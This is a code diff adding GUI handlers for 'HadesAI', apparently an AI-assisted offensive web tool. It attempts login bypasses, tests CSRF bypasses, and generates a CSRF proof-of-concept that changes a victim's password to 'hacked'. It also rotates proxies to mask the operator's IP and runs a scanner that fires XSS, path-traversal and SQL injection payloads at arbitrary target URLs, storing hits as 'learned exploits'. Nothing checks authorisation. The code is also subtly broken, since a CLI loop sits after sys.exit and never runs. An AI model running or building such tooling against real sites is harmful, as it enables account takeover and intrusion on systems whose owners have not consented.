+            self.injection_results.setItem(i, 1, QTableWidgetItem(str(r.get('value', ''))[:30]))
+            self.injection_results.setItem(i, 2, QTableWidgetItem(str(r.get('status', 'Error'))))
+            self.injection_results.setItem(i, 3, QTableWidgetItem(str(r.get('length', '-'))))
+            
+            interesting = r.get('interesting', False)
+            int_item = QTableWidgetItem("⚠️ YES" if interesting else "-")
+            int_item.setForeground(QColor("#ffa500" if interesting else "#666"))
+            self.injection_results.setItem(i, 4, int_item)
+            
+        interesting_count = sum(1 for r in results if r.get('interesting'))
+        self._add_chat_message('assistant', f"Injection complete. {interesting_count} interesting responses found.")
+        
+    def _try_login_bypass(self):
+        url = self.login_url.text()
+        if not url:
+            QMessageBox.warning(self, "Error", "Enter login URL")
+            return
+            
+        user_field = self.user_field.text()
+        pass_field = self.pass_field.text()
+        bypass_type = self.bypass_type.currentText()
+        
+        self._add_chat_message('tool', f"Attempting {bypass_type} on {url}...")
+        
+        results = self.ai.auth_bypass.try_login_bypass(url, user_field, pass_field, bypass_type)
+        
+        self.auth_results.setRowCount(len(results))
+        for i, r in enumerate(results):
+            self.auth_results.setItem(i, 0, QTableWidgetItem(f"{r.get('username', '')}:{r.get('password', '')}"[:30]))
+            self.auth_results.setItem(i, 1, QTableWidgetItem(str(r.get('status', 'Error'))))
+            self.auth_results.setItem(i, 2, QTableWidgetItem(str(r.get('length', '-'))))
+            
+            bypass = r.get('potential_bypass', False)
+            bypass_item = QTableWidgetItem("🔓 POSSIBLE" if bypass else "-")
+            bypass_item.setForeground(QColor("#ff6b6b" if bypass else "#666"))
+            self.auth_results.setItem(i, 3, bypass_item)
+            
+            self.auth_results.setItem(i, 4, QTableWidgetItem(r.get('redirect', '')[:30]))
+            
+        bypass_count = sum(1 for r in results if r.get('potential_bypass'))
+        self._add_chat_message('assistant', f"Login bypass test complete. {bypass_count} potential bypasses found!")
+        
+    def _test_csrf_bypass(self):
+        url = self.csrf_url.text()
+        if not url:
+            QMessageBox.warning(self, "Error", "Enter target URL")
+            return
+            
+        self._add_chat_message('tool', f"Testing CSRF bypass on {url}...")
+        
+        results = self.ai.auth_bypass.test_csrf_bypass(url)
+        
+        self.auth_results.setRowCount(len(results))
+        for i, r in enumerate(results):
+            self.auth_results.setItem(i, 0, QTableWidgetItem(r.get('technique', '')))
+            self.auth_results.setItem(i, 1, QTableWidgetItem(str(r.get('status', 'Error'))))
+            self.auth_results.setItem(i, 2, QTableWidgetItem(str(r.get('length', '-'))))
+            
+            success = r.get('success', False)
+            success_item = QTableWidgetItem("✓ BYPASS" if success else "✗")
+            success_item.setForeground(QColor("#ff6b6b" if success else "#69db7c"))
+            self.auth_results.setItem(i, 3, success_item)
+            
+            self.auth_results.setItem(i, 4, QTableWidgetItem(r.get('error', '')[:30]))
+            
+    def _generate_csrf_poc(self):
+        url = self.csrf_url.text()
+        if not url:
+            QMessageBox.warning(self, "Error", "Enter target URL")
+            return
+            
+        poc = self.ai.auth_bypass.generate_csrf_poc(url, 'POST', {'action': 'change_password', 'new_password': 'hacked'})
+        
+        filename, _ = QFileDialog.getSaveFileName(self, "Save CSRF PoC", "csrf_poc.html", "HTML Files (*.html)")
+        if filename:
+            with open(filename, 'w') as f:
+                f.write(poc)
+            self._add_chat_message('assistant', f"CSRF PoC saved to {filename}")
+            QMessageBox.information(self, "Saved", f"CSRF PoC saved to {filename}")
+            
+    def _toggle_proxy(self, state):
+        self.ai.proxy_manager.enabled = state == Qt.CheckState.Checked.value
+        status = "Enabled" if self.ai.proxy_manager.enabled else "Disabled"
+        self.proxy_status.setText(f"Proxy: {status}")
+        self._add_chat_message('tool', f"Proxy {status.lower()}")
+        
+    def _save_proxy_settings(self):
+        self.ai.proxy_manager.proxy_type = self.proxy_type_combo.currentText()
+        self.ai.proxy_manager.proxy_host = self.proxy_host_input.text()
+        self.ai.proxy_manager.proxy_port = self.proxy_port_input.value()
+        self.ai.proxy_manager.proxy_user = self.proxy_user_input.text() or None
+        self.ai.proxy_manager.proxy_pass = self.proxy_pass_input.text() or None
+        
+        # Rotating proxies
+        proxy_list = self.proxy_list_input.toPlainText().strip().split('\n')
+        self.ai.proxy_manager.proxy_list = [p.strip() for p in proxy_list if p.strip()]
+        
+        self._add_chat_message('assistant', f"Proxy settings saved: {self.ai.proxy_manager.proxy_type}")
+        QMessageBox.information(self, "Saved", "Proxy settings saved")
+        
+    def _test_proxy(self):
+        if not self.ai.proxy_manager.enabled:
+            QMessageBox.warning(self, "Warning", "Enable proxy first")
+            return
+            
+        self._add_chat_message('tool', "Testing proxy connection...")
+        result = self.ai.proxy_manager.test_connection()
+        
+        if result.get('success'):
+            self.proxy_status.setText(f"Proxy: Connected | IP: {result['ip']}")
+            self.proxy_status.setStyleSheet("font-size: 14px; padding: 10px; color: #69db7c;")
+            self._add_chat_message('assistant', f"✓ Proxy working! Your IP: {result['ip']}")
+        else:
+            self.proxy_status.setText(f"Proxy: Connection Failed")
+            self.proxy_status.setStyleSheet("font-size: 14px; padding: 10px; color: #ff6b6b;")
+            self._add_chat_message('tool', f"Proxy test failed: {result.get('error')}")
+
+    # ========== Code Analysis ==========
+    
+    def _analyze_code(self):
+        code = self.code_input.toPlainText()
+        if not code:
+            return
+            
+        self.vuln_tree.clear()
+        
+        patterns = {
+            'sql_injection': [r'execute\s*\([^)]*\+', r'cursor\.execute\s*\([^,]+%'],
+            'xss': [r'innerHTML\s*=', r'document\.write'],
+            'command_injection': [r'os\.system', r'subprocess.*shell\s*=\s*True', r'eval\s*\('],
+            'hardcoded_secrets': [r'password\s*=\s*["\'][^"\']+["\']', r'api_key\s*='],
+        }
+        
+        for vuln_type, pats in patterns.items():
+            for pat in pats:
+                for match in re.finditer(pat, code, re.IGNORECASE):
+                    line = code[:match.start()].count('\n') + 1
+                    item = QTreeWidgetItem([vuln_type, 'HIGH', str(line), match.group()[:50]])
+                    item.setForeground(0, QColor('#ff6b6b'))
+                    self.vuln_tree.addTopLevelItem(item)
+class AutoReconScanner(QThread):
+    progress = pyqtSignal(int)
+    log = pyqtSignal(str)
+    finished = pyqtSignal(list)
+
+    def __init__(self, target_url, kb):
+        super().__init__()
+        self.url = target_url
+        self.kb = kb
+        self._stop = False
+
+    def stop(self):
+        self._stop = True
+
+    def run(self):
+        self.log.emit(f"🔎 Scanning {self.url}...")
+
+        findings = []
+        try:
+            test_vectors = {
+                "XSS": "<script>alert(1)</script>",
+                "Traversal": "../../../../etc/passwd",
+                "SQLi": "' OR 1=1--",
+            }
+
+            for vuln_type, payload in test_vectors.items():
+                if self._stop:
+                    break
+
+                # Example: https://example.com/?vuln_payload
+                test_url = f"{self.url}?test={payload}"
+                try:
+                    r = requests.get(test_url, timeout=5)
+                    if payload in r.text:
+                        finding = {
+                            "type": vuln_type,
+                            "payload": payload,
+                            "url": test_url,
+                            "confidence": 0.9
+                        }
+                        findings.append(finding)
+                        self.log.emit(f"[{vuln_type}] Signature: {payload} | Confidence: 0.90")
+
+                        # Store pattern
+                        pattern = SecurityPattern(
+                            pattern_id=hashlib.sha256(payload.encode()).hexdigest()[:16],
+                            pattern_type=vuln_type,
+                            signature=payload,
+                            confidence=0.9,
+                            occurrences=1,
+                            examples=[payload],
+                            countermeasures=[],
+                            cwe_ids=[]
+                        )
+                        self.kb.store_pattern(pattern)
+
+                        # Store as exploit
+                        self.kb.store_learned_exploit(
+                            source_url=self.url,
+                            exploit_type=vuln_type,
+                            code=payload,
+                            description=f"AutoRecon detected potential {vuln_type} at {test_url} using `{payload}`"
+                        )
+
+                except requests.RequestException:
+                    continue
+
+            self.log.emit("✅ Scan completed and stored.")
+        except Exception as e:
+            self.log.emit(f"❌ Error: {str(e)}")
+
+        self.finished.emit(findings)
+
+
+def main():
+    app = QApplication(sys.argv)
+    app.setStyle('Fusion')
+    window = HadesGUI()
+    window.show()
+    sys.exit(app.exec())
+
+
+if __name__ == "__main__":
+    main()
+    ai = HadesAI()
+    print("HadesAI :: Enter input. Use ::mode chat|code|explain to switch modes.")
+    while True:
+        try:
+            user_input = input(">> ")
+            if user_input.lower() in ["exit", "quit"]:
+                break
+            response = ai.dispatch(user_input)
+            print(response)
+        except KeyboardInterrupt:
+            print("\n[HadesAI] Session terminated.")
+            break
